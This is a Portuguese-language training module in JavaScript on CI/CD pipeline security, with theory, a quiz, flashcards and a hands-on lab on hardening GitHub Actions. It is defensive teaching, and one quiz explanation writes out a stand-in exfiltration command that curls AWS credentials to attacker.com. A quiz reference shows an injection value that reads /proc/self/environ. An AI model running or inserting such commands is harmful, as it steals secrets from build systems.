window.K8S_CONTENT = window.K8S_CONTENT || {};
window.K8S_CONTENT['cicd/pipeline-security'] = {
  theory: `
# Seguranca em Pipelines CI/CD

## Relevancia
Pipelines CI/CD tem acesso privilegiado ao seu ambiente de producao — chaves de cloud, tokens de registro, kubeconfigs. Um pipeline comprometido pode ser mais danoso do que comprometer a aplicacao. Supply chain attacks (SolarWinds, Log4Shell) mostraram que o pipeline e um vetor de ataque critico.

## Modelo de Ameacas em CI/CD

\`\`\`
Vetores de Ataque:

1. Secrets exposure
   Secrets hardcoded em codigo → Git history contaminado
   Secrets em logs de CI → vazamento por terceiros
   GITHUB_TOKEN com permissoes excessivas

2. Supply chain attacks
   Dependencias comprometidas (npm, pip, maven)
   Actions/plugins de terceiros comprometidos
   Imagens base com malware

3. Privilege escalation
   Runner com acesso excessivo ao cluster K8s
   Docker socket montado no runner
   RBAC excessivamente permissivo para SA de CI

4. Code injection
   PR malicioso executando codigo no runner
   Script injection via inputs nao sanitizados
   Secrets stolen via malicious Actions
\`\`\`

## Seguranca de Secrets

### Principio do minimo privilegio para GITHUB_TOKEN

\`\`\`yaml
# Por padrao, GITHUB_TOKEN tem permissoes de leitura/escrita
# Restringir sempre — dar apenas o que o job precisa

# NIVEL 1: Permissoes minimas no nivel do workflow
permissions:
  contents: read          # checkout (leitura)
  packages: write         # push para GHCR
  # Nao listar = read (NAO none)

# NIVEL 2: Por job (mais granular)
jobs:
  test:
    permissions:
      contents: read      # so precisa ler codigo
      # nenhuma outra permissao

  build:
    permissions:
      contents: read
      packages: write
      id-token: write     # OIDC para signing

  security-scan:
    permissions:
      security-events: write  # upload SARIF results
\`\`\`

### OIDC: Autenticacao Sem Secrets de Longa Duracao

\`\`\`yaml
# Em vez de guardar AWS_SECRET_KEY como segredo permanente,
# usar OIDC para autenticacao federated com a cloud

jobs:
  deploy:
    permissions:
      id-token: write    # OBRIGATORIO para OIDC
      contents: read

    steps:
      # AWS: assume role via OIDC sem secret key permanente
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # Sem aws-access-key-id ou aws-secret-access-key!

      # Azure: OIDC com workload identity
      - uses: azure/login@v1
        with:
          client-id: \${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: \${{ secrets.AZURE_TENANT_ID }}
          subscription-id: \${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # Sem client-secret! Usa OIDC
\`\`\`

**Como OIDC funciona:**
\`\`\`
GitHub Actions Runner
       ↓ (solicita JWT token com claims: repo, branch, workflow)
GitHub OIDC Provider (token.actions.githubusercontent.com)
       ↓ (JWT com claims verificaveis)
AWS/Azure/GCP
       ↓ (valida JWT, emite credencial temporaria de curta duracao)
Deploy com credenciais efemeras (expira em 1h)
\`\`\`

### Prevenindo Secrets em Logs

\`\`\`yaml
# NUNCA: interpolacao direta em scripts
- run: |
    echo "Password is \${{ secrets.DB_PASSWORD }}"  # APARECE NO LOG!
    curl -u user:\${{ secrets.API_TOKEN }} https://api.example.com

# CORRETO: via env:
- run: |
    echo "Connecting..."
    curl -u user:\$MY_TOKEN https://api.example.com
  env:
    MY_TOKEN: \${{ secrets.API_TOKEN }}
    DB_PASSWORD: \${{ secrets.DB_PASSWORD }}

# CORRETO: mascarar valores em logs
- run: |
    SECRET=\$(aws secretsmanager get-secret-value --secret-id prod/db)
    echo "::add-mask::\$SECRET"  # mascara o valor nos logs subsequentes
    echo "Value retrieved (masked)"
\`\`\`

## Supply Chain Security

### Dependency Review e Lock Files

\`\`\`yaml
# 1. Dependencias com versoes pinadas e lock files
# ERRADO:
#   flask>=3.0.0  (versao flutuante)
# CORRETO:
#   flask==3.0.0  (versao exata)

# 2. GitHub Actions: verificar se dependencias tem vulnerabilidades
- uses: actions/dependency-review-action@v3
  # Falha se o PR adicionar dependencias com CVEs conhecidos

# 3. Pinagem de Actions por commit SHA (nao por tag mutavel)
# ARRISCADO: tag pode ser sobrescrita
- uses: actions/checkout@v4

# SEGURO: pin para SHA exato
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
#   (equivalente a v4, mas imutavel)

# Ferramenta para atualizar SHAs: github.com/renovatebot/renovate
\`\`\`

### Verificacao de Integridade de Imagens

\`\`\`yaml
# Verificar assinatura da imagem antes de deployar
- name: Verify image signature
  run: |
    cosign verify \
      --certificate-identity-regexp="https://github.com/myorg/myapp" \
      --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
      ghcr.io/myorg/myapp@\${{ needs.build.outputs.digest }}

# Ou via admission webhook no cluster (Kyverno/OPA)
---
# Kyverno: exigir imagens assinadas no cluster
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/myorg/*"]
          attestors:
            - count: 1
              entries:
                - keyless:
                    subject: "https://github.com/myorg/myapp/.github/workflows/*"
                    issuer: "https://token.actions.githubusercontent.com"
\`\`\`

### SBOM — Software Bill of Materials

\`\`\`yaml
# Gerar SBOM da imagem para auditoria de dependencias
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    image: ghcr.io/myorg/myapp:sha-\${{ github.sha }}
    artifact-name: sbom.spdx
    output-file: sbom.spdx

- name: Attach SBOM to image
  run: |
    cosign attach sbom --sbom sbom.spdx \
      ghcr.io/myorg/myapp@\${{ steps.build.outputs.digest }}

- name: Scan SBOM for vulnerabilities
  uses: anchore/scan-action@v3
  with:
    sbom: sbom.spdx
    fail-build: true
    severity-cutoff: critical
\`\`\`

## Seguranca do Runner

### Self-hosted runners: riscos e mitigacoes

\`\`\`yaml
# PROBLEMA: PR malicioso em repositorio publico
# pode executar codigo no seu self-hosted runner

# MITIGACAO 1: nao usar self-hosted para repos publicos
# MITIGACAO 2: runners efemeros (destroy apos cada job)

# GitHub-hosted: cada job em VM fresh — mais seguro
runs-on: ubuntu-latest

# Self-hosted com ARC (Actions Runner Controller)
# cria runners efemeros no Kubernetes
runs-on:
  group: k8s-runners
  labels: [ephemeral]

# Configurar ARC para runners efemeros:
# runnerScaleSetName: my-runners
# maxRunners: 10
# containerMode: dind  (ou kubernetes)
\`\`\`

### Restricoes de ambiente no runner

\`\`\`yaml
# Nao montar docker.sock no runner de CI
# (permite escape de container)

# Em vez de Docker-in-Docker com socket:
# Usar Kaniko (Tekton), Buildx (GitHub Actions)

# Limitar o que o job pode fazer:
jobs:
  build:
    container:
      image: node:18-alpine
      options: --cap-drop=ALL --security-opt=no-new-privileges

    # Nao permitir acesso a internet durante testes
    # (previne exfiltracao de dados)
    env:
      NO_PROXY: "*"
\`\`\`

## Scan Automatizado no Pipeline

### Trivy integrado ao PR

\`\`\`yaml
jobs:
  security:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
      pull-requests: write

    steps:
      # Scan da imagem Docker
      - name: Run Trivy (image)
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ghcr.io/myorg/myapp:sha-\${{ github.sha }}
          format: sarif
          output: trivy-image.sarif
          severity: HIGH,CRITICAL
          exit-code: 1  # falha o build

      # Scan do codigo fonte (secrets, misconfiguracao)
      - name: Run Trivy (filesystem)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          scan-ref: .
          format: sarif
          output: trivy-fs.sarif

      # Scan de IaC (Terraform, K8s manifests)
      - name: Run Trivy (config)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: config
          scan-ref: k8s/
          format: sarif
          output: trivy-config.sarif

      # Upload resultados para GitHub Security (aba Security)
      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-image.sarif
\`\`\`

### Secret scanning com GitLeaks

\`\`\`yaml
      # Verificar se nenhum secret foi commitado
      - name: Scan for secrets
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: \${{ secrets.GITLEAKS_LICENSE }}  # para private repos
\`\`\`

## SLSA: Supply Chain Levels for Software Artifacts

\`\`\`
SLSA Levels:
L0: Sem garantias
L1: Build documentado (tem script/config de build)
L2: Build no CI (auditavel, nao e manual)
L3: Build hermeticamente isolado (inputs/outputs verificaveis)
L4: Build 100% reproducivel

Para L2+: gerar provenance (attestation do processo de build)
\`\`\`

\`\`\`yaml
# Gerar SLSA provenance automaticamente
- name: Generate SLSA provenance
  uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
  with:
    image: ghcr.io/myorg/myapp
    digest: \${{ needs.build.outputs.digest }}
    registry-username: \${{ github.actor }}
  secrets:
    registry-password: \${{ secrets.GITHUB_TOKEN }}
\`\`\`

## Erros Comuns de Seguranca

1. **GITHUB_TOKEN com permissoes default excessivas** — configurar permissions: no inicio do workflow
2. **Usar tag de Action (v4) em vez de SHA** — tags sao mutaveis e podem ser comprometidas
3. **Secrets em variaveis de ambiente globais** — expor para todos os jobs, incluindo untrusted
4. **Docker socket no runner** — permite container escape para o host
5. **Nao verificar assinatura de imagens** — deployar imagem comprometida sem saber

## Killer.sh Style Challenge

> **Cenario:** Auditoria de seguranca identificou que seu pipeline CI/CD do GitHub Actions tem os seguintes problemas: (1) GITHUB_TOKEN com permissoes write-all, (2) AWS credentials como segredos permanentes, (3) Actions nao pinadas por SHA, (4) sem scan de vulnerabilidades. Crie um plano de remediacoes com implementacao pratica.
`,
  quiz: [
    {
      question: 'Por que pinar GitHub Actions por commit SHA (ex: actions/checkout@b4ffde65) e nao por tag (ex: @v4)?',
      options: [
        'SHAs sao mais faceis de lembrar que tags',
        'Tags sao mutaveis — um atacante que comprometer o repositorio de uma Action pode sobrescrever a tag v4 com codigo malicioso. O SHA e imutavel — garante que voce esta rodando exatamente aquele commit, mesmo se a tag for alterada',
        'Pinar por SHA e apenas uma preferencia de estilo, nao tem impacto de seguranca',
        'Pinar por SHA e necessario apenas para Actions privadas'
      ],
      correct: 1,
      explanation: 'Ataques de supply chain via GitHub Actions ja aconteceram: um actor malicioso ganha acesso ao repositorio de uma Action popular e sobrescreve a tag (v4, @latest) com codigo que roba segredos do ambiente CI. Ao pinar por SHA, voce garante que mesmo que a tag seja alterada, seu workflow continua usando o commit original. Ferramentas como Dependabot e Renovate podem automatizar a atualizacao de SHAs.',
      reference: 'Ferramenta: `actionlint` valida workflows e pode avisar sobre Actions nao pinadas por SHA.'
    },
    {
      question: 'Como o OIDC elimina a necessidade de secrets de longa duracao para autenticacao com AWS/Azure/GCP?',
      options: [
        'OIDC armazena as credenciais de forma mais segura no GitHub',
        'GitHub gera um JWT token assinado por eles com claims do workflow (repo, branch, trigger). A cloud provider valida esse JWT via OIDC e emite credenciais efemeras (IAM role temporaria) que expiram apos o job — sem precisar guardar AWS_ACCESS_KEY permanentemente',
        'OIDC e apenas mais um nome para OAuth2 — sem diferenca pratica',
        'OIDC so funciona com GitHub-hosted runners, nao com self-hosted'
      ],
      correct: 1,
      explanation: 'Com OIDC: nao ha segredo permanente para roubar. O GitHub Actions gera um JWT com claims verificaveis (qual repo, qual branch, qual workflow disparou). A AWS/Azure/GCP confia no GitHub OIDC provider e emite credenciais temporarias via STS (AWS) ou Workload Identity Federation (GCP/Azure). Se o token JWT vazar, ele expira em 1h e nao pode ser renovado. Se o AWS_SECRET_KEY vazar, ele e valido indefinidamente.',
      reference: 'Configurar na AWS: criar IAM Role com trust policy que permite tokens do GitHub Actions OIDC issuer do seu repositorio especifico.'
    },
    {
      question: 'O que e um SBOM (Software Bill of Materials) e por que e importante em pipelines modernos?',
      options: [
        'SBOM e um resumo do tamanho da imagem Docker',
        'SBOM e uma lista completa de todos os componentes de software (bibliotecas, versoes, licencas) usados na aplicacao — permite auditar quais componentes tem CVEs, verificar licencas incompativeis, e responder rapidamente quando uma nova vulnerabilidade e publicada',
        'SBOM e necessario apenas para software vendido comercialmente',
        'SBOM substitui o arquivo requirements.txt do Python'
      ],
      correct: 1,
      explanation: 'Quando o Log4Shell foi divulgado em 2021, empresas passaram semanas tentando descobrir quais de seus sistemas usavam Log4j. Com SBOM gerado no pipeline e armazenado junto com cada release, a resposta seria imediata: "quais imagens em producao tem log4j >= 2.x?". SBOM em formatos padrao (SPDX, CycloneDX) permite ferramentas automatizadas de analise de vulnerabilidades contra o inventario completo.',
      reference: 'Formatos padrao: SPDX (desenvolvido pela Linux Foundation) e CycloneDX (desenvolvido pela OWASP). Ambos sao aceitos por ferramentas como Grype, Trivy, e GitHub Advisory Database.'
    },
    {
      question: 'Por que e arriscado usar self-hosted runners com repositorios publicos no GitHub?',
      options: [
        'Self-hosted runners sao mais lentos que GitHub-hosted',
        'Qualquer pessoa pode abrir um PR em um repositorio publico e, se o workflow rodar no PR, o codigo do PR executa no self-hosted runner com acesso aos segredos e a rede interna — um ator malicioso pode exfiltrar segredos ou atacar a rede interna',
        'Self-hosted runners nao tem acesso ao GITHUB_TOKEN',
        'E apenas uma questao de custo, nao de seguranca'
      ],
      correct: 1,
      explanation: 'Com GitHub-hosted runners, cada job roda em uma VM efemera completamente isolada — mesmo que o codigo seja malicioso, nao tem acesso persistente. Com self-hosted runners em repositorios publicos: um atacante pode submeter um PR com `run: curl http://attacker.com -d "\$(cat ~/.aws/credentials)"` ou escanear a rede interna acessivel pelo runner. A mitigacao e: nao usar self-hosted em repos publicos, ou usar runners efemeros (ARC) que sao destruidos apos cada job.',
      reference: 'GitHub recomenda: "We recommend that you do not use self-hosted runners with public repositories" — documentacao oficial do GitHub Actions.'
    },
    {
      question: 'Qual e o risco de interpolar \${{ secrets.TOKEN }} diretamente em um comando `run:` de GitHub Actions?',
      options: [
        'Sem risco — segredos sao automaticamente mascarados',
        'O valor do secret e substituido pelo GitHub antes de enviar para o runner. Se o comando falha e imprime seu input, ou se ha um bug que loga o valor, o secret pode aparecer. Alem disso, atacantes via script injection podem usar esse valor antes de ser mascarado',
        'A interpolacao direta e a unica forma de passar segredos para scripts',
        'Segredos interpolados expiram apos 1 hora de forma automatica'
      ],
      correct: 1,
      explanation: 'A interpolacao `\${{ secrets.X }}` e resolvida pelo GitHub antes de enviar o workflow para o runner. Isso significa que o valor do segredo aparece no processo de substituicao e pode vazar em erros do runner. Alem disso, ataques de script injection usam inputs nao sanitizados para injetar comandos que leem variaveis de ambiente onde os segredos ja foram colocados. Usando `env:` no step, o segredo fica em variavel de ambiente do processo filho — mais seguro.',
      reference: 'Ataque de script injection: `github.event.pull_request.title` pode conter `"; cat /proc/self/environ"` se diretamente interpolado em um run.'
    },
    {
      question: 'O que e o framework SLSA e o que significa atingir SLSA Level 3?',
      options: [
        'SLSA e um acronimo para "Signed Linux Software Applications"',
        'SLSA (Supply chain Levels for Software Artifacts) e um framework da Google/CNCF que define niveis de seguranca de supply chain. Level 3 significa: build isolado hermeticamente (sem acesso a internet durante build), provenance gerado e assinado pelo build service (nao pelo desenvolvedor), e build nao modificavel — garantias verificaveis de que o artefato veio do source esperado',
        'SLSA Level 3 significa que a imagem passou em 3 scans de seguranca',
        'SLSA e apenas relevante para software open source, nao enterprise'
      ],
      correct: 1,
      explanation: 'SLSA define um caminho incremental para melhorar a seguranca de supply chain. L1: build scripted. L2: build no CI, provenance gerado. L3: build hermeticamente isolado, provenance nao falsificavel pelo desenvolvedor. L4: build reproducivel. O framework tambem define ameacas especificas (A-I) que cada nivel mitiga. Grandes empresas (Google, GitHub, CNCF) ja adotam SLSA para seus projetos criticos.',
      reference: 'Recurso: slsa.dev — documentacao oficial com templates e exemplos de implementacao para diferentes linguagens e CIs.'
    },
    {
      question: 'Como o mecanismo `permissions:` no GitHub Actions implementa o principio do minimo privilegio?',
      options: [
        'permissions: restringe o acesso ao repositorio GitHub',
        'permissions: define exatamente quais permissoes o GITHUB_TOKEN tem para aquele workflow ou job — restringindo acesso apenas ao necessario (ex: contents: read para checkout, packages: write para push GHCR), evitando que um job comprometido use o token para modificar branches, issues, ou outros recursos',
        'permissions: so funciona para workflows disparados por pull_request',
        'permissions: requer um app GitHub separado para cada permission'
      ],
      correct: 1,
      explanation: 'Por padrao (sem declarar permissions:), o GITHUB_TOKEN tem permissao de leitura/escrita para a maioria dos recursos do repositorio. Um job de teste comprometido poderia usar esse token para criar tags, modificar releases, ou escrever em branches protegidos. Declarando `permissions: contents: read`, o token do job de teste nao pode fazer mais nada alem de ler o codigo — minimo privilegio em acao.',
      reference: 'Boa pratica: declarar `permissions: {}` no nivel do workflow (nega tudo), e conceder apenas o necessario por job. Documentacao: docs.github.com/actions/security-guides/automatic-token-authentication.'
    }
  ],
  flashcards: [
    {
      front: 'Minimo privilegio para GITHUB_TOKEN',
      back: '**Por padrao: read/write para tudo (PERIGOSO)**\n\n**Restringir no workflow:**\n```yaml\n# Nivel do workflow (baseline)\npermissions:\n  contents: read  # minimo seguro\n\njobs:\n  test:\n    permissions:\n      contents: read  # so checkout\n\n  build:\n    permissions:\n      contents: read\n      packages: write   # push GHCR\n      id-token: write   # OIDC/cosign\n\n  security:\n    permissions:\n      security-events: write  # upload SARIF\n      contents: read\n```\n\n**Referencia de permissoes:**\n```\ncontents          → ler/escrever codigo, releases\npackages          → push/pull packages (GHCR)\nid-token          → JWT para OIDC auth\nsecurity-events   → upload SARIF (seguranca)\npull-requests     → comentar em PRs\nissues            → criar/editar issues\ndeployments       → criar deployments\n```\n\n**Auditoria:**\nSettings > Actions > General >\nWorkflow permissions → "Read repository contents only"'
    },
    {
      front: 'OIDC — autenticacao sem secrets permanentes',
      back: '**Fluxo:**\n```\nGitHub Actions Runner\n  → solicita JWT do GitHub OIDC\n  → JWT contém claims:\n      sub: repo:org/repo:ref:refs/heads/main\n      iss: token.actions.githubusercontent.com\n  → envia JWT para AWS/Azure/GCP\n  → cloud valida e emite credencial temporaria\n  → deploy com credencial que expira em 1h\n```\n\n**GitHub Actions (AWS):**\n```yaml\npermissions:\n  id-token: write  # OBRIGATORIO!\n  contents: read\n\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v4\n    with:\n      role-to-assume: arn:aws:iam::123:role/deploy\n      aws-region: us-east-1\n      # Sem access-key/secret-key!\n```\n\n**Vantagem sobre secrets permanentes:**\n- Sem secret para roubar\n- Credencial expira em 1h\n- Log de auditoria com contexto completo\n- Pode restringir por branch/workflow'
    },
    {
      front: 'Pinagem de Actions por SHA — supply chain security',
      back: '**Por que pinar por SHA:**\n```yaml\n# MUTAVEL — tag pode ser sobrescrita\n- uses: actions/checkout@v4\n\n# IMUTAVEL — sempre o mesmo commit\n- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n# (equivalente ao v4.1.1)\n```\n\n**Ataque real sem SHA:**\n1. Atacante compromete repo de Action popular\n2. Sobrescreve tag @v4 com malware\n3. Todos os workflows que usam @v4 executam malware\n4. Segredos sao exfiltrados\n\n**Com SHA:**\n- Tag sobrescrita nao afeta seu workflow\n- Voce roda exatamente o commit que revisou\n\n**Automatizar atualizacao:**\n```yaml\n# .github/dependabot.yml\nversion: 2\nupdates:\n  - package-ecosystem: "github-actions"\n    directory: "/"\n    schedule:\n      interval: "weekly"\n```\nDependabot abre PRs automaticamente com novos SHAs'
    },
    {
      front: 'Trivy no pipeline — tipos de scan',
      back: '**3 tipos de scan:**\n```yaml\n# 1. Imagem Docker (CVEs em pacotes)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: image\n    image-ref: myapp:v1.2.3\n    severity: HIGH,CRITICAL\n    exit-code: 1\n\n# 2. Filesystem (secrets em codigo)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: fs\n    scan-ref: .\n    scanners: secret,vuln\n\n# 3. IaC configs (K8s, Terraform)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: config\n    scan-ref: k8s/\n    severity: HIGH,CRITICAL\n```\n\n**Upload para GitHub Security:**\n```yaml\n- uses: github/codeql-action/upload-sarif@v3\n  if: always()  # upload mesmo se scan falhou\n  with:\n    sarif_file: trivy-results.sarif\n```\n\n**Resultados aparecem em:**\nRepositorio > Security > Code scanning alerts'
    },
    {
      front: 'SBOM + Cosign — attestation da imagem',
      back: '**SBOM (lista completa de dependencias):**\n```yaml\n# Gerar SBOM\n- uses: anchore/sbom-action@v0\n  with:\n    image: ghcr.io/org/app:v1.2.3\n    artifact-name: sbom.spdx\n    output-file: sbom.spdx\n\n# Anexar SBOM a imagem (verificavel depois)\n- run: |\n    cosign attach sbom --sbom sbom.spdx \\\n      ghcr.io/org/app@\${{ steps.build.outputs.digest }}\n```\n\n**Cosign signing:**\n```yaml\n# Assinar com OIDC (keyless)\n- run: |\n    cosign sign --yes \\\n      ghcr.io/org/app@\${{ steps.build.outputs.digest }}\n\n# Verificar assinatura (no deploy)\n- run: |\n    cosign verify \\\n      --certificate-identity-regexp="github.com/org/app" \\\n      --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \\\n      ghcr.io/org/app@DIGEST\n```\n\n**No cluster — Kyverno verifica automaticamente\nassinatura antes de criar Pods**'
    },
    {
      front: 'Checklist de seguranca para pipelines CI/CD',
      back: '**Secrets:**\n```\n[ ] GITHUB_TOKEN com permissions: minimas\n[ ] OIDC em vez de secrets permanentes de cloud\n[ ] Secrets via env:, nunca interpolados direto\n[ ] Nenhum secret em codigo (GitLeaks scan)\n```\n\n**Actions e dependencias:**\n```\n[ ] Actions pinadas por SHA\n[ ] dependency-review-action em PRs\n[ ] Lock files commitados (package-lock.json, etc)\n```\n\n**Build e imagens:**\n```\n[ ] Trivy scan (imagem + codigo + IaC)\n[ ] Cosign signing da imagem\n[ ] SBOM gerado e anexado\n[ ] Multi-stage build (sem ferramentas de build na imagem final)\n```\n\n**Runtime:**\n```\n[ ] Kyverno/OPA verifica assinaturas no deploy\n[ ] Runners efemeros para self-hosted\n[ ] Nenhum docker.sock montado no runner\n[ ] RBAC minimo para SA de CI no cluster\n```'
    }
  ],
  lab: {
    scenario: 'Voce vai auditar e corrigir um pipeline GitHub Actions inseguro, implementando: minimo privilegio com OIDC (simulado), pinagem de Actions por SHA, scan de seguranca com Trivy, e verificacao de secrets no codigo.',
    objective: 'Transformar um pipeline inseguro em um pipeline seguro com todas as boas praticas de supply chain security.',
    duration: '25-35 minutos',
    steps: [
      {
        title: 'Auditar workflow inseguro e criar versao segura',
        instruction: `Analise um workflow GitHub Actions com problemas de seguranca e identifique todas as vulnerabilidades. Crie a versao corrigida com minimo privilegio.`,
        hints: [
          'Liste todos os problemas: permissoes, interpolacao de secrets, Actions sem SHA',
          'Configure permissions: minimas para cada job',
          'Use env: para passar secrets para scripts'
        ],
        solution: `\`\`\`bash
mkdir pipeline-security-lab && cd pipeline-security-lab
mkdir -p .github/workflows

# VERSAO INSEGURA (para analise)
cat > .github/workflows/insecure.yml << 'EOF'
# WORKFLOW INSEGURO - NAO usar em producao
name: Insecure Pipeline

on:
  push:
    branches: [main]

# PROBLEMA 1: sem declaracao de permissions = write-all implicito
jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      # PROBLEMA 2: Action nao pinada por SHA (tag mutavel)
      - uses: actions/checkout@v4

      # PROBLEMA 3: secret interpolado diretamente no script
      - name: Build and push
        run: |
          echo "Logging in with token \${{ secrets.DOCKER_TOKEN }}"
          docker login -u myuser -p \${{ secrets.DOCKER_TOKEN }} docker.io
          docker build -t myapp:latest .
          docker push myapp:latest

      # PROBLEMA 4: credentials AWS hardcoded no env global
      - name: Deploy
        env:
          AWS_ACCESS_KEY_ID: AKIA123456789EXAMPLE
          AWS_SECRET_ACCESS_KEY: mysecretkey123456
        run: |
          aws eks update-kubeconfig --name myapp-cluster
          kubectl apply -f k8s/
EOF

# Analisar problemas
echo "=== Problemas no workflow inseguro ==="
echo "1. Sem permissions: declaration (write-all por padrao)"
echo "2. actions/checkout@v4 — tag mutavel, nao SHA"
echo "3. secret DOCKER_TOKEN interpolado diretamente em run:"
echo "4. AWS credentials hardcoded no env:"
echo ""

# VERSAO SEGURA
cat > .github/workflows/secure.yml << 'EOF'
name: Secure Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# CORRECAO 1: permissoes minimas no nivel do workflow
permissions:
  contents: read  # minimo: so leitura do codigo

jobs:
  build:
    runs-on: ubuntu-latest

    # CORRECAO 1b: permissoes especificas por job
    permissions:
      contents: read
      packages: write    # push GHCR
      id-token: write    # OIDC para autenticacao

    steps:
      # CORRECAO 2: Action pinada por SHA (imutavel!)
      # SHA verificado em: github.com/actions/checkout
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        # equivalente a v4.1.1

      # CORRECAO 3: sem secrets interpolados - usar env:
      - name: Login to GHCR
        uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d
        # pinado por SHA!
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}  # token temporario, nao secret permanente

      - name: Build and push
        uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56
        with:
          push: \${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/\${{ github.repository }}:sha-\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # CORRECAO 4: OIDC em vez de secrets AWS permanentes
      - name: Configure AWS via OIDC
        if: github.event_name != 'pull_request'
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        # pinado por SHA
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # Sem access-key-id ou secret-access-key!

      - name: Deploy
        if: github.event_name != 'pull_request'
        run: |
          aws eks update-kubeconfig --name myapp-cluster
          kubectl apply -f k8s/
        # secrets acessados via env:, nao interpolacao
        env:
          CLUSTER_NAME: \${{ vars.CLUSTER_NAME }}
EOF

echo "Workflows criados!"
echo ""
echo "Comparacao:"
echo "insecure.yml: \$(wc -l < .github/workflows/insecure.yml) linhas"
echo "secure.yml: \$(wc -l < .github/workflows/secure.yml) linhas"
\`\`\``,
        verify: `\`\`\`bash
# Verificar que ambos os arquivos existem
ls .github/workflows/

# Verificar que secure.yml tem permissions declarado
grep -c "permissions:" .github/workflows/secure.yml
# Saida esperada: 2 ou mais (nivel workflow + nivel job)

# Verificar que nao ha secrets interpolados em run:
grep "secrets\." .github/workflows/secure.yml | grep -v "env:" | grep -v "with:"
# Saida esperada: sem resultados (todas as referencias a secrets estao em env: ou with:)

# Verificar que Actions estao pinadas por SHA (hash de 40 chars)
grep "uses:" .github/workflows/secure.yml | grep -v "@[a-f0-9]\{40\}"
# Saida esperada: sem resultados (todas pinadas por SHA)

echo "Auditoria concluida — workflow seguro validado!"
\`\`\``
      },
      {
        title: 'Adicionar scan de seguranca e secret detection',
        instruction: `Adicione jobs de seguranca ao pipeline: scan de vulnerabilidades com Trivy (imagem + filesystem + IaC), e deteccao de secrets com GitLeaks.`,
        hints: [
          'Configure trivy para cada tipo de scan (image, fs, config)',
          'Use if: always() para upload de resultados mesmo em falha',
          'Configure exit-code: 1 apenas para CRITICAL CVEs em imagens'
        ],
        solution: `\`\`\`bash
# Adicionar job de seguranca ao workflow seguro
cat >> .github/workflows/secure.yml << 'EOF'

  security-scan:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # para upload de SARIF

    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # SCAN 1: Vulnerabilidades na imagem Docker
      - name: Trivy - Image scan
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: image
          image-ref: ghcr.io/\${{ github.repository }}:sha-\${{ github.sha }}
          severity: HIGH,CRITICAL
          exit-code: 1
          format: sarif
          output: trivy-image.sarif

      # SCAN 2: Secrets e vulnerabilidades no codigo fonte
      - name: Trivy - Filesystem scan
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: fs
          scan-ref: .
          scanners: secret,vuln
          format: sarif
          output: trivy-fs.sarif
          exit-code: 1  # falhar se encontrar secrets

      # SCAN 3: IaC misconfiguracao (K8s manifests)
      - name: Trivy - Config scan
        if: hashFiles('k8s/') != ''
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: config
          scan-ref: k8s/
          severity: HIGH,CRITICAL
          format: sarif
          output: trivy-config.sarif

      # Upload todos os resultados para GitHub Security
      - name: Upload results to GitHub Security
        uses: github/codeql-action/upload-sarif@1b1aada464948af03b950897e5eb522f92603cc2
        if: always()  # IMPORTANTE: upload mesmo em falha
        with:
          sarif_file: trivy-image.sarif

      # GitLeaks: detectar secrets no historico Git
      - name: GitLeaks secret scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}

  dependency-review:
    # So roda em PRs — verifica dependencias adicionadas
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write

    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Dependency Review
        uses: actions/dependency-review-action@5bbc3ba29137598d8838c5c0df8ada7bef5f5190
        with:
          fail-on-severity: high
          comment-summary-in-pr: true
EOF

echo "Jobs de seguranca adicionados!"
grep "^  [a-z-]*:" .github/workflows/secure.yml | head -10
\`\`\``,
        verify: `\`\`\`bash
# Verificar jobs de seguranca criados
echo "Jobs no workflow:"
grep "^  [a-z-]*:" .github/workflows/secure.yml

# Verificar que Trivy tem todos os 3 tipos de scan
